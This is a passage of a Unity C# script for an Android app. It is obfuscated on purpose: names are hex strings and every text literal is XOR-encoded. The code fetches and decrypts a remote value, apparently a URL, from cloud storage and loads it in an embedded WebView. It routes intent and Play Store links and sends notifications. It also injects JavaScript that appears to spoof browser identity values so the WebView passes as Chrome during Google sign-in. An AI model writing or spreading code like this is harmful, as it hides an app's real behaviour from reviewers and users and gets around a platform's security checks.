using AndroidInstallReferrer;
using DG.Tweening;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Unity.Notifications.Android;
using Unity.Services.Authentication;
using Unity.Services.CloudSave;
using Unity.Services.CloudSave.Models;
using Unity.Services.CloudSave.Models.Data.Player;
using Unity.Services.Core;
using Unity.Services.PushNotifications;
using UnityEngine;
using UnityEngine.Android;
using UnityEngine.InputSystem;
using UnityEngine.InputSystem.EnhancedTouch;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;
using Application = UnityEngine.Application;

public class _0xf9f92de4 : MonoBehaviour
{
    private bool TryOpenExternalLikeChrome(string _0x939352b3)
    {
        if (string.IsNullOrEmpty(_0x939352b3))
            return false;
        if (_0x939352b3.StartsWith(_0xc5baefe6._0xaf772892(new byte[9] { 126, 121, 99, 114, 121, 99, 45, 56, 56 }, 23), StringComparison.OrdinalIgnoreCase))
            return _0xa7d47d96(_0x939352b3);
        if (_0x991fa068(_0x939352b3))
            return _0x294155b5(_0x939352b3, null);
        if (!_0x939352b3.StartsWith(_0xc5baefe6._0xaf772892(new byte[7] { 202, 214, 214, 210, 152, 141, 141 }, 162), StringComparison.OrdinalIgnoreCase) && !_0x939352b3.StartsWith(_0xc5baefe6._0xaf772892(new byte[8] { 87, 75, 75, 79, 76, 5, 16, 16 }, 63), StringComparison.OrdinalIgnoreCase) && !_0x939352b3.StartsWith(_0xc5baefe6._0xaf772892(new byte[11] { 135, 132, 137, 147, 146, 220, 132, 138, 135, 136, 141 }, 230), StringComparison.OrdinalIgnoreCase))
        {
            return _0x1102e7aa(_0x939352b3);
        }

        return false;
    }

    private bool _0x294155b5(string _0xccc2c34b, string _0x5db835ff)
    {
        string _0x78cd9c3e = _0x8af47733(_0xccc2c34b);
        if (string.IsNullOrEmpty(_0x78cd9c3e))
            _0x78cd9c3e = _0x5db835ff;
        if (_0x7436d889(_0x78cd9c3e))
            return true;
        string _0xf5e97743 = string.IsNullOrEmpty(_0x78cd9c3e) ? _0xc5baefe6._0xaf772892(new byte[29] { 203, 215, 215, 211, 208, 153, 140, 140, 211, 207, 194, 218, 141, 196, 204, 204, 196, 207, 198, 141, 192, 204, 206, 140, 208, 215, 204, 209, 198 }, 163) : _0xc5baefe6._0xaf772892(new byte[46] { 190, 162, 162, 166, 165, 236, 249, 249, 166, 186, 183, 175, 248, 177, 185, 185, 177, 186, 179, 248, 181, 185, 187, 249, 165, 162, 185, 164, 179, 249, 183, 166, 166, 165, 249, 178, 179, 162, 183, 191, 186, 165, 233, 191, 178, 235 }, 214) + _0x78cd9c3e;
        WLog(_0xc5baefe6._0xaf772892(new byte[35] { 178, 153, 131, 158, 156, 148, 189, 152, 154, 148, 209, 156, 144, 131, 154, 148, 133, 209, 151, 144, 157, 157, 147, 144, 146, 154, 209, 144, 130, 209, 134, 148, 147, 203, 209 }, 241) + _0xf5e97743);
        return _0x1102e7aa(_0xf5e97743);
    }

    internal Vector2 lastSize = Vector2.zero;
    // WEB VIEW LOGIC END
    internal void _0xf89350ae()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0x34df539d = new AndroidNotificationChannel
        {
            Id = _0xc5baefe6._0xaf772892(new byte[15] { 104, 105, 106, 109, 121, 96, 120, 83, 111, 100, 109, 98, 98, 105, 96 }, 12),
            Name = _0xc5baefe6._0xaf772892(new byte[15] { 171, 138, 137, 142, 154, 131, 155, 207, 172, 135, 142, 129, 129, 138, 131 }, 239),
            Importance = Importance.High,
            Description = _0xc5baefe6._0xaf772892(new byte[21] { 246, 212, 223, 212, 195, 208, 221, 145, 223, 222, 197, 216, 215, 216, 210, 208, 197, 216, 222, 223, 194 }, 177)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0x34df539d);
        // Build notification
        var _0x24268b29 = new AndroidNotification
        {
            Title = _0xe7c92b19[UnityEngine.Random.Range(0, _0xe7c92b19.Length)],
            Text = _0xc5baefe6._0xaf772892(new byte[21] { 106, 89, 78, 11, 82, 68, 94, 11, 88, 94, 89, 78, 11, 95, 68, 11, 78, 83, 66, 95, 20 }, 43),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x24268b29, _0xc5baefe6._0xaf772892(new byte[15] { 90, 91, 88, 95, 75, 82, 74, 97, 93, 86, 95, 80, 80, 91, 82 }, 62));
    }

    private string _0xe165a715()
    {
        string _0x72adad52 = _0x6db230d1();
        if (string.IsNullOrEmpty(_0x72adad52))
            return _0xc5baefe6._0xaf772892(new byte[7] { 93, 68, 66, 79, 11, 27, 16 }, 43);
        string _0xb5d7dfc4 = _0x72adad52.Replace(_0xc5baefe6._0xaf772892(new byte[1] { 231 }, 187), _0xc5baefe6._0xaf772892(new byte[2] { 249, 249 }, 165)).Replace(_0xc5baefe6._0xaf772892(new byte[1] { 195 }, 228), _0xc5baefe6._0xaf772892(new byte[2] { 110, 21 }, 50));
        var _0x2e988475 = Regex.Match(_0x72adad52, _0xc5baefe6._0xaf772892(new byte[12] { 216, 243, 233, 244, 246, 254, 180, 179, 199, 255, 176, 178 }, 155));
        string _0xf40a3c98 = _0x2e988475.Success ? _0x2e988475.Groups[1].Value : _0xc5baefe6._0xaf772892(new byte[3] { 218, 217, 219 }, 235);
        return _0xc5baefe6._0xaf772892(new byte[12] { 172, 226, 241, 234, 231, 240, 237, 235, 234, 172, 173, 255 }, 132) + _0xc5baefe6._0xaf772892(new byte[8] { 106, 125, 110, 60, 105, 125, 33, 59 }, 28) + _0xb5d7dfc4 + _0xc5baefe6._0xaf772892(new byte[2] { 200, 212 }, 239) + _0xc5baefe6._0xaf772892(new byte[30] { 57, 46, 61, 111, 63, 61, 32, 59, 32, 114, 1, 46, 57, 38, 40, 46, 59, 32, 61, 97, 63, 61, 32, 59, 32, 59, 54, 63, 42, 116 }, 79) + _0xc5baefe6._0xaf772892(new byte[121] { 61, 46, 53, 56, 47, 50, 52, 53, 123, 63, 62, 61, 115, 52, 57, 49, 119, 48, 62, 34, 119, 45, 58, 55, 114, 32, 47, 41, 34, 32, 20, 57, 49, 62, 56, 47, 117, 63, 62, 61, 50, 53, 62, 11, 41, 52, 43, 62, 41, 47, 34, 115, 52, 57, 49, 119, 48, 62, 34, 119, 32, 60, 62, 47, 97, 61, 46, 53, 56, 47, 50, 52, 53, 115, 114, 32, 41, 62, 47, 46, 41, 53, 123, 45, 58, 55, 96, 38, 119, 56, 52, 53, 61, 50, 60, 46, 41, 58, 57, 55, 62, 97, 47, 41, 46, 62, 38, 114, 96, 38, 56, 58, 47, 56, 51, 115, 62, 114, 32, 38, 38 }, 91) + _0xc5baefe6._0xaf772892(new byte[26] { 35, 34, 33, 111, 55, 53, 40, 51, 40, 107, 96, 50, 52, 34, 53, 6, 32, 34, 41, 51, 96, 107, 50, 38, 110, 124 }, 71) + _0xc5baefe6._0xaf772892(new byte[52] { 102, 103, 100, 42, 114, 112, 109, 118, 109, 46, 37, 99, 114, 114, 84, 103, 112, 113, 107, 109, 108, 37, 46, 119, 99, 44, 112, 103, 114, 110, 99, 97, 103, 42, 45, 92, 79, 109, 120, 107, 110, 110, 99, 94, 45, 45, 46, 37, 37, 43, 43, 57 }, 2) + _0xc5baefe6._0xaf772892(new byte[37] { 151, 150, 149, 219, 131, 129, 156, 135, 156, 223, 212, 131, 159, 146, 135, 149, 156, 129, 158, 212, 223, 212, 191, 154, 157, 134, 139, 211, 146, 129, 158, 133, 203, 159, 212, 218, 200 }, 243) + _0xc5baefe6._0xaf772892(new byte[34] { 13, 12, 15, 65, 25, 27, 6, 29, 6, 69, 78, 31, 12, 7, 13, 6, 27, 78, 69, 78, 46, 6, 6, 14, 5, 12, 73, 32, 7, 10, 71, 78, 64, 82 }, 105) + _0xc5baefe6._0xaf772892(new byte[30] { 159, 158, 157, 211, 139, 137, 148, 143, 148, 215, 220, 150, 154, 131, 175, 148, 142, 152, 147, 171, 148, 146, 149, 143, 136, 220, 215, 206, 210, 192 }, 251) + _0xc5baefe6._0xaf772892(new byte[48] { 219, 221, 214, 212, 217, 206, 221, 143, 218, 206, 203, 146, 212, 205, 221, 206, 193, 203, 220, 149, 244, 212, 205, 221, 206, 193, 203, 149, 136, 236, 199, 221, 192, 194, 198, 218, 194, 136, 131, 217, 202, 221, 220, 198, 192, 193, 149, 136 }, 175) + _0xf40a3c98 + _0xc5baefe6._0xaf772892(new byte[35] { 157, 199, 150, 193, 216, 200, 219, 212, 222, 128, 157, 253, 213, 213, 221, 214, 223, 154, 249, 210, 200, 213, 215, 223, 157, 150, 204, 223, 200, 201, 211, 213, 212, 128, 157 }, 186) + _0xf40a3c98 + _0xc5baefe6._0xaf772892(new byte[238] { 5, 95, 14, 89, 64, 80, 67, 76, 70, 24, 5, 108, 77, 86, 31, 99, 29, 96, 80, 67, 76, 70, 5, 14, 84, 71, 80, 81, 75, 77, 76, 24, 5, 16, 22, 5, 95, 127, 14, 79, 77, 64, 75, 78, 71, 24, 86, 80, 87, 71, 14, 82, 78, 67, 86, 68, 77, 80, 79, 24, 5, 99, 76, 70, 80, 77, 75, 70, 5, 14, 69, 71, 86, 106, 75, 69, 74, 103, 76, 86, 80, 77, 82, 91, 116, 67, 78, 87, 71, 81, 24, 68, 87, 76, 65, 86, 75, 77, 76, 10, 11, 89, 80, 71, 86, 87, 80, 76, 2, 114, 80, 77, 79, 75, 81, 71, 12, 80, 71, 81, 77, 78, 84, 71, 10, 89, 67, 80, 65, 74, 75, 86, 71, 65, 86, 87, 80, 71, 24, 5, 67, 80, 79, 5, 14, 64, 75, 86, 76, 71, 81, 81, 24, 5, 20, 22, 5, 14, 79, 77, 64, 75, 78, 71, 24, 86, 80, 87, 71, 14, 79, 77, 70, 71, 78, 24, 5, 5, 14, 82, 78, 67, 86, 68, 77, 80, 79, 24, 5, 99, 76, 70, 80, 77, 75, 70, 5, 14, 82, 78, 67, 86, 68, 77, 80, 79, 116, 71, 80, 81, 75, 77, 76, 24, 5, 19, 22, 12, 18, 12, 18, 5, 14, 87, 67, 100, 87, 78, 78, 116, 71, 80, 81, 75, 77, 76, 24, 5 }, 34) + _0xf40a3c98 + _0xc5baefe6._0xaf772892(new byte[117] { 202, 212, 202, 212, 202, 212, 195, 153, 205, 223, 153, 153, 223, 171, 134, 142, 129, 135, 144, 202, 128, 129, 130, 141, 138, 129, 180, 150, 139, 148, 129, 150, 144, 157, 204, 148, 150, 139, 144, 139, 200, 195, 145, 151, 129, 150, 165, 131, 129, 138, 144, 160, 133, 144, 133, 195, 200, 159, 131, 129, 144, 222, 130, 145, 138, 135, 144, 141, 139, 138, 204, 205, 159, 150, 129, 144, 145, 150, 138, 196, 145, 133, 128, 223, 153, 200, 135, 139, 138, 130, 141, 131, 145, 150, 133, 134, 136, 129, 222, 144, 150, 145, 129, 153, 205, 223, 153, 135, 133, 144, 135, 140, 204, 129, 205, 159, 153 }, 228) + _0xc5baefe6._0xaf772892(new byte[5] { 0, 84, 85, 84, 70 }, 125);
    }

    private Task _0x457eeb84(IEnumerator _0x96c9c84f)
    {
        var _0x70c45eb1 = new TaskCompletionSource<bool>();
        StartCoroutine(_0x46c230b8(_0x96c9c84f, _0x70c45eb1));
        return _0x70c45eb1.Task;
    }

    private string _0xc22f74d0 = "";
    private ApplicationInstallMode _0x412214b2 = ApplicationInstallMode.Unknown;
    internal bool IsGoogleAuthFlowUrl(string _0xd930355a)
    {
        if (string.IsNullOrEmpty(_0xd930355a))
            return false;
        return _0xd930355a.IndexOf(_0xc5baefe6._0xaf772892(new byte[19] { 54, 52, 52, 56, 34, 57, 35, 36, 121, 48, 56, 56, 48, 59, 50, 121, 52, 56, 58 }, 87), StringComparison.OrdinalIgnoreCase) >= 0 || _0xd930355a.IndexOf(_0xc5baefe6._0xaf772892(new byte[16] { 5, 7, 7, 11, 17, 10, 16, 23, 74, 3, 11, 11, 3, 8, 1, 74 }, 100), StringComparison.OrdinalIgnoreCase) >= 0 || _0xd930355a.IndexOf(_0xc5baefe6._0xaf772892(new byte[21] { 81, 89, 89, 81, 90, 83, 67, 69, 83, 68, 85, 89, 88, 66, 83, 88, 66, 24, 85, 89, 91 }, 54), StringComparison.OrdinalIgnoreCase) >= 0 || _0xd930355a.IndexOf(_0xc5baefe6._0xaf772892(new byte[11] { 173, 185, 190, 171, 190, 163, 169, 228, 169, 165, 167 }, 202), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    internal bool _0x991fa068(string _0xaae4fa40)
    {
        return _0xaae4fa40.StartsWith(_0xc5baefe6._0xaf772892(new byte[9] { 241, 253, 238, 247, 249, 232, 166, 179, 179 }, 156), StringComparison.OrdinalIgnoreCase) || _0xaae4fa40.StartsWith(_0xc5baefe6._0xaf772892(new byte[24] { 37, 57, 57, 61, 62, 119, 98, 98, 61, 33, 44, 52, 99, 42, 34, 34, 42, 33, 40, 99, 46, 34, 32, 98 }, 77), StringComparison.OrdinalIgnoreCase) || _0xaae4fa40.StartsWith(_0xc5baefe6._0xaf772892(new byte[23] { 175, 179, 179, 183, 253, 232, 232, 183, 171, 166, 190, 233, 160, 168, 168, 160, 171, 162, 233, 164, 168, 170, 232 }, 199), StringComparison.OrdinalIgnoreCase);
    }

    private bool _0xa7d47d96(string _0x783c6e3d)
    {
        try
        {
            using (var _0x79d06510 = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[30] { 112, 124, 126, 61, 102, 125, 122, 103, 106, 32, 119, 61, 99, 127, 114, 106, 118, 97, 61, 70, 125, 122, 103, 106, 67, 127, 114, 106, 118, 97 }, 19)))
            using (var _0xdaf3f6f3 = _0x79d06510.GetStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 116, 98, 101, 101, 114, 121, 99, 86, 116, 99, 126, 97, 126, 99, 110 }, 23)))
            using (var _0x2a30791f = _0xdaf3f6f3.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[17] { 235, 233, 248, 220, 237, 239, 231, 237, 235, 233, 193, 237, 226, 237, 235, 233, 254 }, 140)))
            using (var _0x6da5d38e = new AndroidJavaClass(_0xc5baefe6._0xaf772892(new byte[22] { 78, 65, 75, 93, 64, 70, 75, 1, 76, 64, 65, 91, 74, 65, 91, 1, 102, 65, 91, 74, 65, 91 }, 47)))
            using (var _0x063691ff = _0x6da5d38e.CallStatic<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[8] { 131, 146, 129, 128, 150, 166, 129, 154 }, 243), _0x783c6e3d, 1))
            {
                string _0xf8f6901b = _0x063691ff.Call<string>(_0xc5baefe6._0xaf772892(new byte[14] { 240, 242, 227, 196, 227, 229, 254, 249, 240, 210, 239, 227, 229, 246 }, 151), _0xc5baefe6._0xaf772892(new byte[20] { 45, 61, 32, 56, 60, 42, 61, 16, 41, 46, 35, 35, 45, 46, 44, 36, 16, 58, 61, 35 }, 79));
                string _0x2a453c17 = _0x063691ff.Call<string>(_0xc5baefe6._0xaf772892(new byte[10] { 208, 210, 195, 231, 214, 212, 220, 214, 208, 210 }, 183));
                _0x063691ff.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[11] { 138, 143, 143, 168, 138, 159, 142, 140, 132, 153, 146 }, 235), _0xc5baefe6._0xaf772892(new byte[33] { 194, 205, 199, 209, 204, 202, 199, 141, 202, 205, 215, 198, 205, 215, 141, 192, 194, 215, 198, 196, 204, 209, 218, 141, 225, 241, 236, 244, 240, 226, 225, 239, 230 }, 163));
                _0x063691ff.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[11] { 157, 138, 130, 128, 153, 138, 170, 151, 155, 157, 142 }, 239), _0xc5baefe6._0xaf772892(new byte[20] { 145, 129, 156, 132, 128, 150, 129, 172, 149, 146, 159, 159, 145, 146, 144, 152, 172, 134, 129, 159 }, 243));
                if (_0x063691ff.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[15] { 5, 18, 4, 24, 27, 1, 18, 54, 20, 3, 30, 1, 30, 3, 14 }, 119), _0x2a30791f) != null)
                {
                    WLog(_0xc5baefe6._0xaf772892(new byte[24] { 39, 12, 22, 11, 9, 1, 40, 13, 15, 1, 68, 11, 20, 1, 10, 68, 13, 10, 16, 1, 10, 16, 94, 68 }, 100) + _0x783c6e3d);
                    _0x063691ff.Call<AndroidJavaObject>(_0xc5baefe6._0xaf772892(new byte[8] { 71, 66, 66, 96, 74, 71, 65, 85 }, 38), 0x10000000);
                    _0xdaf3f6f3.Call(_0xc5baefe6._0xaf772892(new byte[13] { 32, 39, 50, 33, 39, 18, 48, 39, 58, 37, 58, 39, 42 }, 83), _0x063691ff);
                    return true;
                }

                if (_0x7436d889(_0x2a453c17))
                    return true;
                if (!string.IsNullOrEmpty(_0xf8f6901b))
                {
                    WLog(_0xc5baefe6._0xaf772892(new byte[28] { 160, 139, 145, 140, 142, 134, 175, 138, 136, 134, 195, 138, 141, 151, 134, 141, 151, 195, 133, 130, 143, 143, 129, 130, 128, 136, 217, 195 }, 227) + _0xf8f6901b);
                    if (_0x991fa068(_0xf8f6901b))
                        return _0x294155b5(_0xf8f6901b, _0x2a453c17);
                    return _0x1102e7aa(_0xf8f6901b);
                }

                WLog(_0xc5baefe6._0xaf772892(new byte[30] { 227, 200, 210, 207, 205, 197, 236, 201, 203, 197, 128, 201, 206, 212, 197, 206, 212, 128, 206, 207, 128, 200, 193, 206, 196, 204, 197, 210, 154, 128 }, 160) + _0x783c6e3d);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[26] { 225, 202, 208, 205, 207, 199, 238, 203, 201, 199, 130, 203, 204, 214, 199, 204, 214, 130, 196, 195, 203, 206, 199, 198, 152, 130 }, 162) + e.Message);
            return true;
        }
    }

    private string _0x7147f8ab()
    {
        string _0x3abcfcbb = _0xc5baefe6._0xaf772892(new byte[62] { 128, 131, 130, 133, 132, 135, 134, 137, 136, 139, 138, 141, 140, 143, 142, 145, 144, 147, 146, 149, 148, 151, 150, 153, 152, 155, 160, 163, 162, 165, 164, 167, 166, 169, 168, 171, 170, 173, 172, 175, 174, 177, 176, 179, 178, 181, 180, 183, 182, 185, 184, 187, 209, 208, 211, 210, 213, 212, 215, 214, 217, 216 }, 225);
        System.Random _0x938e482f = new System.Random();
        int _0xea77b8b7 = _0x938e482f.Next(8, 16);
        return new string (Enumerable.Repeat(_0x3abcfcbb, _0xea77b8b7).Select(_0x7d62b7ae => _0x7d62b7ae[_0x938e482f.Next(_0x7d62b7ae.Length)]).ToArray());
    }

    private string _0xab1a166a()
    {
        float _0xbdb1d4b8 = Time.realtimeSinceStartup;
        if (_0xbdb1d4b8 < 0f)
            _0xbdb1d4b8 = 0f;
        int _0x9f4fae94 = (int)(_0xbdb1d4b8 * 1000f);
        int _0x8efaf39b = _0x9f4fae94 / 60000;
        int _0x35e20281 = (_0x9f4fae94 / 1000) % 60;
        int _0xd757732c = _0x9f4fae94 % 1000;
        return string.Format(_0xc5baefe6._0xaf772892(new byte[21] { 243, 184, 178, 184, 184, 245, 178, 243, 185, 178, 184, 184, 245, 178, 243, 186, 178, 184, 184, 184, 245 }, 136), _0x8efaf39b, _0x35e20281, _0xd757732c);
    }

    private async Task<string> _0xdbc70a7d(int _0x71d67c94 = 5, int _0xa931a3df = 500)
    {
        try
        {
            List<EntityData> _0x6562ed1a = new List<EntityData>();
            int _0x4f0c34b5 = 0;
            do
            {
                _0x6562ed1a = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0xc5baefe6._0xaf772892(new byte[8] { 127, 99, 110, 118, 106, 125, 70, 107 }, 15), _0x6486cede, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x6486cede }), new QueryOptions())).ToList();
                await Task.Delay(_0xa931a3df);
            }
            while (_0x6562ed1a.Count == 0 && _0x4f0c34b5++ < _0x71d67c94);
            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[33] { 26, 21, 36, 50, 53, 28, 97, 18, 32, 55, 36, 37, 97, 13, 40, 47, 42, 97, 16, 52, 36, 51, 56, 97, 51, 36, 50, 52, 45, 53, 50, 123, 97 }, 65) + JsonConvert.SerializeObject(_0x6562ed1a, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[39] { 173, 162, 147, 133, 130, 171, 214, 165, 151, 128, 147, 146, 214, 186, 159, 152, 157, 214, 167, 131, 147, 132, 143, 214, 132, 147, 133, 131, 154, 130, 133, 214, 149, 153, 131, 152, 130, 204, 214 }, 246) + _0x6562ed1a.Count);
                }
#endif
            }

            var _0x6a841194 = _0x6562ed1a.SelectMany(_0x0ef78974 => _0x0ef78974.Data).FirstOrDefault(_0x76b5dfb3 => _0x76b5dfb3.Key == _0x6486cede)?.Value.GetAs<string>() ?? string.Empty;
            _0x6a841194 = Decrypt(_0x6a841194, _0x6486cede);
            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[24] { 81, 94, 111, 121, 126, 87, 42, 70, 101, 107, 110, 42, 121, 107, 124, 111, 110, 42, 102, 99, 100, 97, 48, 42 }, 10) + _0x6a841194);
                }
#endif
            }

            return _0x6a841194;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0xc5baefe6._0xaf772892(new byte[39] { 3, 12, 61, 43, 44, 5, 120, 31, 61, 44, 120, 55, 42, 120, 40, 57, 42, 43, 61, 120, 43, 57, 46, 61, 60, 120, 52, 49, 54, 51, 120, 62, 57, 49, 52, 61, 60, 98, 120 }, 88) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    private Action _0xd337239b;
    private void _0x6ff2b4a3(string _0x491f2623)
    {
        _0x169fb14b();
        StartCoroutine(_0x38d0db50(_0x491f2623));
    }

    internal bool firstLoadShown = false;
    private void _0xf3734d75(string _0xadcce111)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0xc5baefe6._0xaf772892(new byte[34] { 247, 248, 201, 223, 216, 241, 140, 234, 201, 216, 207, 196, 140, 233, 212, 216, 222, 205, 140, 252, 217, 223, 196, 140, 232, 205, 216, 205, 140, 254, 205, 219, 150, 140 }, 172) + _0xadcce111);
#endif
            }
        }

        var _0x1a28a223 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xadcce111);
        StartCoroutine(_0x0c0de3ba(_0x1a28a223));
    }

    private void _0x4bf480d8(UniWebView _0xdbc6827e)
    {
        if (_0x5a7a8b0e)
            return;
        _0x5a7a8b0e = true;
        _0xdbc6827e.AddUrlScheme(_0xc5baefe6._0xaf772892(new byte[2] { 17, 2 }, 101));
        _0xdbc6827e.AddUrlScheme(_0xc5baefe6._0xaf772892(new byte[6] { 43, 44, 54, 39, 44, 54 }, 66));
        _0xdbc6827e.AddUrlScheme(_0xc5baefe6._0xaf772892(new byte[6] { 194, 206, 221, 196, 202, 219 }, 175));
        _0xdbc6827e.OnMessageReceived += (_0x4d908488, _0x60f79d13) =>
        {
            if (TryOpenExternalLikeChrome(_0x60f79d13.RawMessage))
            {
                _0xeaf769ec(false);
                return;
            }
        };
        _0xdbc6827e.RegisterShouldHandleRequest(_0xc9d7fe79 =>
        {
            string _0xf161ac99 = _0xc9d7fe79 != null ? _0xc9d7fe79.Url : string.Empty;
            if (string.IsNullOrEmpty(_0xf161ac99))
                return true;
            WLog(_0xc5baefe6._0xaf772892(new byte[21] { 52, 15, 8, 18, 11, 3, 47, 6, 9, 3, 11, 2, 53, 2, 22, 18, 2, 20, 19, 93, 71 }, 103) + _0xf161ac99);
            if (TryOpenExternalLikeChrome(_0xf161ac99))
            {
                _0xeaf769ec(false);
                return false;
            }

            if (_0xc9d7fe79 != null && _0xc9d7fe79.IsMainFrame && IsGoogleAuthFlowUrl(_0xf161ac99) && !_0xd34c5bb5)
            {
                WLog(_0xc5baefe6._0xaf772892(new byte[62] { 179, 159, 151, 144, 222, 169, 155, 156, 168, 151, 155, 137, 222, 154, 155, 138, 155, 157, 138, 155, 154, 222, 185, 145, 145, 153, 146, 155, 222, 159, 139, 138, 150, 222, 171, 172, 178, 222, 211, 192, 222, 140, 155, 146, 145, 159, 154, 222, 137, 151, 138, 150, 222, 185, 145, 145, 153, 146, 155, 222, 171, 191 }, 254));
                _0xd34c5bb5 = true;
                _0xeaf769ec(true);
                _0xcaeec845.SetUserAgent(_0x6db230d1());
                _0xcaeec845.Load(_0xf161ac99);
                return false;
            }

            return true;
        });
        _0xdbc6827e.OnLoadingErrorReceived += (_0x4d908488, _0x4ee8a4ba, _0x60f79d13, _0xc072a18a) =>
        {
            WLog(_0xc5baefe6._0xaf772892(new byte[25] { 210, 254, 246, 241, 191, 200, 250, 253, 201, 246, 250, 232, 191, 218, 237, 237, 240, 237, 165, 191, 252, 240, 251, 250, 162 }, 159) + _0x4ee8a4ba + _0xc5baefe6._0xaf772892(new byte[9] { 155, 214, 222, 200, 200, 218, 220, 222, 134 }, 187) + _0x60f79d13);
            string _0x4349d981 = GetFailingUrl(_0xc072a18a);
            if (string.IsNullOrEmpty(_0x4349d981) || IsAboutBlank(_0x4349d981))
                return;
            _ = _0xeff30011(_0xc5baefe6._0xaf772892(new byte[8] { 125, 124, 85, 111, 120, 120, 101, 120 }, 10));
            WLog(_0xc5baefe6._0xaf772892(new byte[45] { 148, 184, 176, 183, 249, 142, 188, 187, 143, 176, 188, 174, 249, 191, 184, 176, 181, 176, 183, 190, 249, 140, 139, 149, 249, 244, 231, 249, 182, 169, 188, 183, 249, 188, 161, 173, 188, 171, 183, 184, 181, 181, 160, 227, 249 }, 217) + _0x4349d981);
            StopCurrentFailedLoad(_0x4d908488);
            _0x75ff83df(_0x4349d981);
        };
        _0xdbc6827e.OnPageStarted += (_0x4d908488, _0x1aa08084) =>
        {
            _0x4eef55c7 = 0;
            if (_0x141674f7 && IsAboutBlank(_0x1aa08084))
            {
                WLog(_0xc5baefe6._0xaf772892(new byte[27] { 145, 179, 164, 182, 160, 179, 172, 225, 160, 163, 174, 180, 181, 251, 163, 173, 160, 175, 170, 225, 178, 181, 160, 179, 181, 164, 165 }, 193));
                return;
            }

            WLog(_0xc5baefe6._0xaf772892(new byte[29] { 97, 77, 69, 66, 12, 123, 73, 78, 122, 69, 73, 91, 12, 99, 66, 124, 77, 75, 73, 127, 88, 77, 94, 88, 73, 72, 22, 12, 7 }, 44) + (Time.realtimeSinceStartup - _0xbca9a518).ToString(_0xc5baefe6._0xaf772892(new byte[5] { 98, 124, 98, 98, 98 }, 82)) + _0xc5baefe6._0xaf772892(new byte[2] { 25, 74 }, 106) + _0x1aa08084);
            if (TryOpenExternalLikeChrome(_0x1aa08084))
            {
                StopCurrentFailedLoad(_0x4d908488);
                return;
            }

            if (ContainsIgnoreCase(_0x1aa08084, _0xc5baefe6._0xaf772892(new byte[8] { 193, 204, 204, 196, 139, 196, 213, 213 }, 165)) || ContainsIgnoreCase(_0x1aa08084, _0xc5baefe6._0xaf772892(new byte[15] { 193, 208, 200, 159, 198, 216, 213, 214, 212, 197, 159, 211, 221, 222, 214 }, 177)) || _0x1aa08084.StartsWith(_0xc5baefe6._0xaf772892(new byte[25] { 121, 101, 101, 97, 98, 43, 62, 62, 115, 97, 118, 125, 126, 115, 112, 125, 119, 112, 103, 63, 125, 120, 103, 116, 62 }, 17), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x4d908488);
                OpenUrlExternally(_0x1aa08084);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x1aa08084))
            {
                _0xeaf769ec(true);
                WLog(_0xc5baefe6._0xaf772892(new byte[41] { 74, 98, 98, 106, 97, 104, 45, 108, 120, 121, 101, 45, 107, 97, 98, 122, 45, 105, 104, 121, 104, 110, 121, 104, 105, 45, 32, 51, 45, 102, 104, 104, 125, 45, 123, 100, 126, 100, 111, 97, 104 }, 13));
                return;
            }

            _0x073f2856 = true;
            _0xeaf769ec(true);
            WLog(_0xc5baefe6._0xaf772892(new byte[43] { 157, 175, 168, 156, 163, 175, 189, 234, 166, 165, 171, 174, 163, 164, 173, 229, 184, 175, 174, 163, 184, 175, 169, 190, 163, 164, 173, 234, 231, 244, 234, 161, 175, 175, 186, 234, 188, 163, 185, 163, 168, 166, 175 }, 202));
        };
        _0xdbc6827e.OnPageCommitted += (_0x4d908488, _0x1aa08084) =>
        {
            if (_0x141674f7 && IsAboutBlank(_0x1aa08084))
                return;
            WLog(_0xc5baefe6._0xaf772892(new byte[31] { 99, 79, 71, 64, 14, 121, 75, 76, 120, 71, 75, 89, 14, 97, 64, 126, 79, 73, 75, 109, 65, 67, 67, 71, 90, 90, 75, 74, 20, 14, 5 }, 46) + (Time.realtimeSinceStartup - _0xbca9a518).ToString(_0xc5baefe6._0xaf772892(new byte[5] { 94, 64, 94, 94, 94 }, 110)) + _0xc5baefe6._0xaf772892(new byte[2] { 105, 58 }, 26) + _0x1aa08084);
            if (!firstLoadShown && IsHttpUrl(_0x1aa08084))
            {
                firstLoadShown = true;
                _0x073f2856 = false;
                _0xeaf769ec(false);
                _0xe207e0b4();
                _0xbadead4f();
                _0x4d908488.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0xeff30011(_0xc5baefe6._0xaf772892(new byte[9] { 70, 71, 110, 94, 65, 84, 95, 84, 85 }, 49));
